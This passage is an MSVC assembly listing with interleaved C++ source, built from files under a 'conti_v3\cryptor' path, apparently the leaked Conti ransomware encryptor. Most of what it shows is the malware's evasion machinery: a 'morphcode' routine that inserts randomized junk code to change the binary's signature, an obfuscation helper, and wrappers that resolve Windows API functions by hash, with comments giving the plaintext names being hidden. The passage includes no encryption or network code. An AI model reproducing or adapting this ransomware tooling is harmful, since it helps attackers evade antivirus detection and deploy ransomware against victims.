?SToI@@YAHPEAD@Z ENDP					; SToI
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??__Fg_Path@@YAXXZ
text$yd	SEGMENT
??__Fg_Path@@YAXXZ PROC					; `dynamic atexit destructor for 'g_Path'', COMDAT
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path
  00016	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0001b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00022	5f		 pop	 rdi
  00023	5d		 pop	 rbp
  00024	c3		 ret	 0
??__Fg_Path@@YAXXZ ENDP					; `dynamic atexit destructor for 'g_Path''
text$yd	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ??__Eg_Path@@YAXXZ
text$di	SEGMENT
??__Eg_Path@@YAXXZ PROC					; `dynamic initializer for 'g_Path'', COMDAT

; 15   : STATIC std::wstring g_Path;

  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__18E689E6_main@cpp
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path
  00022	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00027	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??__Fg_Path@@YAXXZ ; `dynamic atexit destructor for 'g_Path''
  0002e	e8 00 00 00 00	 call	 atexit
  00033	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003a	5f		 pop	 rdi
  0003b	5d		 pop	 rbp
  0003c	c3		 ret	 0
??__Eg_Path@@YAXXZ ENDP					; `dynamic initializer for 'g_Path''
text$di	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
;	COMDAT ?morphcode@@YAXXZ
_TEXT	SEGMENT
_morph_var$ = 4
?morphcode@@YAXXZ PROC					; morphcode, COMDAT

; 81   : __forceinline void morphcode(void) {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__899FCD3C_mrph@h
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 82   : 	//   
; 83   : 
; 84   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0001b	c7 45 04 40 07
	3b 00		 mov	 DWORD PTR _morph_var$[rbp], 3868480 ; 003b0740H

; 85   : }

  00022	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
?morphcode@@YAXXZ ENDP					; morphcode
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
;	COMDAT ?morphcode@@YAXPEAX@Z
_TEXT	SEGMENT
a$ = 224
?morphcode@@YAXPEAX@Z PROC				; morphcode, COMDAT

; 74   : __forceinline void morphcode(void* a) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__899FCD3C_mrph@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   : 	morphcode((int)a);

  0001f	8b 8d e0 00 00
	00		 mov	 ecx, DWORD PTR a$[rbp]
  00025	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 76   : }

  0002a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00031	5f		 pop	 rdi
  00032	5d		 pop	 rbp
  00033	c3		 ret	 0
?morphcode@@YAXPEAX@Z ENDP				; morphcode
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
;	COMDAT ?morphcode@@YAXH@Z
_TEXT	SEGMENT
_morph_var$ = 4
a$ = 256
?morphcode@@YAXH@Z PROC					; morphcode, COMDAT

; 35   : __forceinline void morphcode(int a) {

$LN22:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__899FCD3C_mrph@h
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 36   : #else
; 37   : __forceinline void morphcode(char* a) {
; 38   : #endif
; 39   : #ifdef __cplusplus
; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0001e	c7 45 04 40 07
	3b 00		 mov	 DWORD PTR _morph_var$[rbp], 3868480 ; 003b0740H

; 41   : #else
; 42   : 	volatile int _morph_var = a;
; 43   : #endif
; 44   : 
; 45   : 	//      ( ) ,  .
; 46   : 	//   ,      ,      ,
; 47   : 	//  .  ,           .
; 48   : 	if (_morph_var % 3) {

  00025	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00028	99		 cdq
  00029	b9 03 00 00 00	 mov	 ecx, 3
  0002e	f7 f9		 idiv	 ecx
  00030	8b c2		 mov	 eax, edx
  00032	85 c0		 test	 eax, eax
  00034	74 34		 je	 SHORT $LN10@morphcode

; 49   : 		_morph_var += (int)a + 2;

  00036	8b 85 00 01 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  0003c	83 c0 02	 add	 eax, 2
  0003f	8b 4d 04	 mov	 ecx, DWORD PTR _morph_var$[rbp]
  00042	03 c8		 add	 ecx, eax
  00044	8b c1		 mov	 eax, ecx
  00046	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN2@morphcode:

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00049	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0004c	99		 cdq
  0004d	83 e2 03	 and	 edx, 3
  00050	03 c2		 add	 eax, edx
  00052	83 e0 03	 and	 eax, 3
  00055	2b c2		 sub	 eax, edx
  00057	85 c0		 test	 eax, eax
  00059	75 0a		 jne	 SHORT $LN3@morphcode
  0005b	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0005e	ff c0		 inc	 eax
  00060	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
  00063	eb e4		 jmp	 SHORT $LN2@morphcode
$LN3@morphcode:

; 51   : 	}

  00065	e9 fb 00 00 00	 jmp	 $LN11@morphcode
$LN10@morphcode:

; 52   : 	else if (_morph_var % 2) {

  0006a	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0006d	99		 cdq
  0006e	83 e0 01	 and	 eax, 1
  00071	33 c2		 xor	 eax, edx
  00073	2b c2		 sub	 eax, edx
  00075	85 c0		 test	 eax, eax
  00077	74 33		 je	 SHORT $LN12@morphcode

; 53   : 		_morph_var -= (int)a - 2;

  00079	8b 85 00 01 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  0007f	83 e8 02	 sub	 eax, 2
  00082	8b 4d 04	 mov	 ecx, DWORD PTR _morph_var$[rbp]
  00085	2b c8		 sub	 ecx, eax
  00087	8b c1		 mov	 eax, ecx
  00089	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN4@morphcode:

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0008c	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0008f	99		 cdq
  00090	b9 03 00 00 00	 mov	 ecx, 3
  00095	f7 f9		 idiv	 ecx
  00097	8b c2		 mov	 eax, edx
  00099	85 c0		 test	 eax, eax
  0009b	75 0a		 jne	 SHORT $LN5@morphcode
  0009d	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000a0	ff c0		 inc	 eax
  000a2	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
  000a5	eb e5		 jmp	 SHORT $LN4@morphcode
$LN5@morphcode:

; 55   : 	}

  000a7	e9 b9 00 00 00	 jmp	 $LN13@morphcode
$LN12@morphcode:

; 56   : 	else if (_morph_var % 4) {

  000ac	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000af	99		 cdq
  000b0	83 e2 03	 and	 edx, 3
  000b3	03 c2		 add	 eax, edx
  000b5	83 e0 03	 and	 eax, 3
  000b8	2b c2		 sub	 eax, edx
  000ba	85 c0		 test	 eax, eax
  000bc	74 4b		 je	 SHORT $LN14@morphcode

; 57   : 		_morph_var = (_morph_var + 2) * ((int)a + 3);

  000be	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000c1	83 c0 02	 add	 eax, 2
  000c4	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR a$[rbp]
  000ca	83 c1 03	 add	 ecx, 3
  000cd	0f af c1	 imul	 eax, ecx
  000d0	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN6@morphcode:

; 58   : 		while (!(_morph_var % 2))

  000d3	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000d6	99		 cdq
  000d7	83 e0 01	 and	 eax, 1
  000da	33 c2		 xor	 eax, edx
  000dc	2b c2		 sub	 eax, edx
  000de	85 c0		 test	 eax, eax
  000e0	75 25		 jne	 SHORT $LN7@morphcode

; 59   : 			if (_morph_var % 5)

  000e2	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000e5	99		 cdq
  000e6	b9 05 00 00 00	 mov	 ecx, 5
  000eb	f7 f9		 idiv	 ecx
  000ed	8b c2		 mov	 eax, edx
  000ef	85 c0		 test	 eax, eax
  000f1	74 0a		 je	 SHORT $LN16@morphcode

; 60   : 				--_morph_var;

  000f3	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  000f6	ff c8		 dec	 eax
  000f8	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
  000fb	eb 08		 jmp	 SHORT $LN17@morphcode
$LN16@morphcode:

; 61   : 			else ++_morph_var;

  000fd	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00100	ff c0		 inc	 eax
  00102	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN17@morphcode:
  00105	eb cc		 jmp	 SHORT $LN6@morphcode
$LN7@morphcode:

; 62   : 	}

  00107	eb 5c		 jmp	 SHORT $LN15@morphcode
$LN14@morphcode:

; 63   : 	else if (_morph_var % 5) {

  00109	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0010c	99		 cdq
  0010d	b9 05 00 00 00	 mov	 ecx, 5
  00112	f7 f9		 idiv	 ecx
  00114	8b c2		 mov	 eax, edx
  00116	85 c0		 test	 eax, eax
  00118	74 4b		 je	 SHORT $LN18@morphcode

; 64   : 		_morph_var = (_morph_var + 11) / ((int)a + 23);

  0011a	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0011d	83 c0 0b	 add	 eax, 11
  00120	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR a$[rbp]
  00126	83 c1 17	 add	 ecx, 23
  00129	99		 cdq
  0012a	f7 f9		 idiv	 ecx
  0012c	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN8@morphcode:

; 65   : 		while (!(_morph_var % 3))

  0012f	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00132	99		 cdq
  00133	b9 03 00 00 00	 mov	 ecx, 3
  00138	f7 f9		 idiv	 ecx
  0013a	8b c2		 mov	 eax, edx
  0013c	85 c0		 test	 eax, eax
  0013e	75 25		 jne	 SHORT $LN9@morphcode

; 66   : 			if (_morph_var % 5)

  00140	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00143	99		 cdq
  00144	b9 05 00 00 00	 mov	 ecx, 5
  00149	f7 f9		 idiv	 ecx
  0014b	8b c2		 mov	 eax, edx
  0014d	85 c0		 test	 eax, eax
  0014f	74 0a		 je	 SHORT $LN19@morphcode

; 67   : 				++_morph_var;

  00151	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00154	ff c0		 inc	 eax
  00156	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
  00159	eb 08		 jmp	 SHORT $LN20@morphcode
$LN19@morphcode:

; 68   : 			else --_morph_var;

  0015b	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0015e	ff c8		 dec	 eax
  00160	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN20@morphcode:
  00163	eb ca		 jmp	 SHORT $LN8@morphcode
$LN9@morphcode:
$LN18@morphcode:
$LN15@morphcode:
$LN13@morphcode:
$LN11@morphcode:

; 69   : 	}
; 70   : }

  00165	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0016c	5f		 pop	 rdi
  0016d	5d		 pop	 rbp
  0016e	c3		 ret	 0
?morphcode@@YAXH@Z ENDP					; morphcode
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?positive_modulo@@YAHHH@Z
_TEXT	SEGMENT
a$ = 224
n$ = 232
?positive_modulo@@YAHHH@Z PROC				; positive_modulo, COMDAT

; 39   : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00008	55		 push	 rbp
  00009	57		 push	 rdi
  0000a	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00011	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00016	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 40   :     return (a % n + n) % n;

  00022	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  00028	99		 cdq
  00029	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0002f	8b c2		 mov	 eax, edx
  00031	03 85 e8 00 00
	00		 add	 eax, DWORD PTR n$[rbp]
  00037	99		 cdq
  00038	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0003e	8b c2		 mov	 eax, edx

; 41   : }

  00040	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00047	5f		 pop	 rdi
  00048	5d		 pop	 rbp
  00049	c3		 ret	 0
?positive_modulo@@YAHHH@Z ENDP				; positive_modulo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z
_TEXT	SEGMENT
pFunction$ = 8
CodePage$ = 256
dwFlags$ = 264
lpWideCharStr$ = 272
cchWideChar$ = 280
lpMultiByteStr$ = 288
cbMultiByte$ = 296
lpDefaultChar$ = 304
lpUsedDefaultChar$ = 312
?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z PROC	; pWideCharToMultiByte, COMDAT

; 1189 : {

$LN3:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00012	55		 push	 rbp
  00013	57		 push	 rdi
  00014	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0001b	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  00020	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00027	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1190 : 	int(WINAPI * pFunction)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
; 1191 : 	pFunction = (int(WINAPI*)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7ae2521c, 9);

  0002c	41 b9 09 00 00
	00		 mov	 r9d, 9
  00032	41 b8 1c 52 e2
	7a		 mov	 r8d, 2061652508		; 7ae2521cH
  00038	ba 0f 00 00 00	 mov	 edx, 15
  0003d	33 c9		 xor	 ecx, ecx
  0003f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00044	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 1192 : 	return pFunction(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);

  00048	48 8b 85 38 01
	00 00		 mov	 rax, QWORD PTR lpUsedDefaultChar$[rbp]
  0004f	48 89 44 24 38	 mov	 QWORD PTR [rsp+56], rax
  00054	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR lpDefaultChar$[rbp]
  0005b	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  00060	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR cbMultiByte$[rbp]
  00066	89 44 24 28	 mov	 DWORD PTR [rsp+40], eax
  0006a	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR lpMultiByteStr$[rbp]
  00071	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  00076	44 8b 8d 18 01
	00 00		 mov	 r9d, DWORD PTR cchWideChar$[rbp]
  0007d	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR lpWideCharStr$[rbp]
  00084	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR dwFlags$[rbp]
  0008a	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR CodePage$[rbp]
  00090	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 1193 : }

  00093	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0009a	5f		 pop	 rdi
  0009b	5d		 pop	 rbp
  0009c	c3		 ret	 0
?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z ENDP	; pWideCharToMultiByte
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z
_TEXT	SEGMENT
pFunction$ = 8
lpCmdLine$ = 256
pNumArgs$ = 264
?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z PROC	; pCommandLineToArgvW, COMDAT

; 700  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 701  : 	LPWSTR* (WINAPI * pFunction)(LPCWSTR, int*);
; 702  : 	pFunction = (LPWSTR * (WINAPI*)(LPCWSTR, int*))getapi::GetProcAddressEx2(NULL, SHELL32_MODULE_ID, 0x6dd8e1ea, 48);//GetProcAddress(hShell32, OBFA("CommandLineToArgvW"));

  00024	41 b9 30 00 00
	00		 mov	 r9d, 48			; 00000030H
  0002a	41 b8 ea e1 d8
	6d		 mov	 r8d, 1842930154		; 6dd8e1eaH
  00030	ba 17 00 00 00	 mov	 edx, 23
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 703  : 	return pFunction(lpCmdLine, pNumArgs);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR pNumArgs$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpCmdLine$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 704  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z ENDP	; pCommandLineToArgvW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcmpiW@@YAHPEB_W0@Z
_TEXT	SEGMENT
pFunction$ = 8
lpString1$ = 256
lpString2$ = 264
?plstrcmpiW@@YAHPEB_W0@Z PROC				; plstrcmpiW, COMDAT

; 341  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 342  : 	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00024	41 b9 51 00 00
	00		 mov	 r9d, 81			; 00000051H
  0002a	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 344  : 	return pFunction(lpString1, lpString2);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpString2$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpString1$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 345  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?plstrcmpiW@@YAHPEB_W0@Z ENDP				; plstrcmpiW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z
_TEXT	SEGMENT
pFunction$ = 8
lpMutexAttributes$ = 256
bInitialOwner$ = 264
lpName$ = 272
?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z PROC ; pCreateMutexA, COMDAT

; 303  : {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00009	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000e	55		 push	 rbp
  0000f	57		 push	 rdi
  00010	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00017	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00023	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 304  : 	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
; 305  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x20d8fa8c, 84);//GetProcAddress(hKernel32, OBFA("CreateMutexA"));

  00028	41 b9 54 00 00
	00		 mov	 r9d, 84			; 00000054H
  0002e	41 b8 8c fa d8
	20		 mov	 r8d, 551090828		; 20d8fa8cH
  00034	ba 0f 00 00 00	 mov	 edx, 15
  00039	33 c9		 xor	 ecx, ecx
  0003b	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00040	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 306  : 	return pFunction(lpMutexAttributes, bInitialOwner, lpName);

  00044	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR lpName$[rbp]
  0004b	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR bInitialOwner$[rbp]
  00051	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpMutexAttributes$[rbp]
  00058	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 307  : }

  0005b	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00062	5f		 pop	 rdi
  00063	5d		 pop	 rbp
  00064	c3		 ret	 0
?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z ENDP ; pCreateMutexA
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetCommandLineW@@YAPEA_WXZ
_TEXT	SEGMENT
pFunction$ = 8
?pGetCommandLineW@@YAPEA_WXZ PROC			; pGetCommandLineW, COMDAT

; 292  : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 293  : 	LPWSTR(WINAPI * pFunction)();
; 294  : 	pFunction = (LPWSTR(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8a0ae76f, 85);//GetProcAddress(hKernel32, OBFA("GetCommandLineW"));

  0001b	41 b9 55 00 00
	00		 mov	 r9d, 85			; 00000055H
  00021	41 b8 6f e7 0a
	8a		 mov	 r8d, -1978996881	; 8a0ae76fH
  00027	ba 0f 00 00 00	 mov	 edx, 15
  0002c	33 c9		 xor	 ecx, ecx
  0002e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00033	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 295  : 	return pFunction();

  00037	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 296  : }

  0003a	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?pGetCommandLineW@@YAPEA_WXZ ENDP			; pGetCommandLineW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
